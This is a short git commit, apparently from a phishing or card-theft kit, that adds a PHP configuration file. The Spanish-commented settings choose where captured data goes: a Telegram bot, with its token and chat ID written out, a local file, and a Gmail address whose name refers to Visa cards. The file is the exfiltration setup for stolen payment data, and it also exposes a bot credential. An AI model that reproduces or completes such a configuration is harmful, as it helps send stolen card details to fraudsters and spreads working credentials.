6d41688f1d58f2335f66dd1b7caf6bf83ca07b84
susana <nicolaslopez66t@gmail.com>
2021-03-04 00:05:52 +0100

    naranja

---
+++ config.php
@@ -0,0 +1,16 @@
+<?php
+// Envio telegram
+// true = SI | false = NO
+$telegram_send = false;
+$bottoken = "1263268363:AAFCSasemRnCch37Wqu00mo6gar0vOf6o4s";
+$chatid = "1399126303";
+
+// Guardar archivo
+// true = SI | false = NO
+$file_save = false;
+
+// Envio Gmail
+// true = SI | false = NO
+$email_send = true;
+$email = "tarjetasvisapordoquier@gmail.com";
+?>
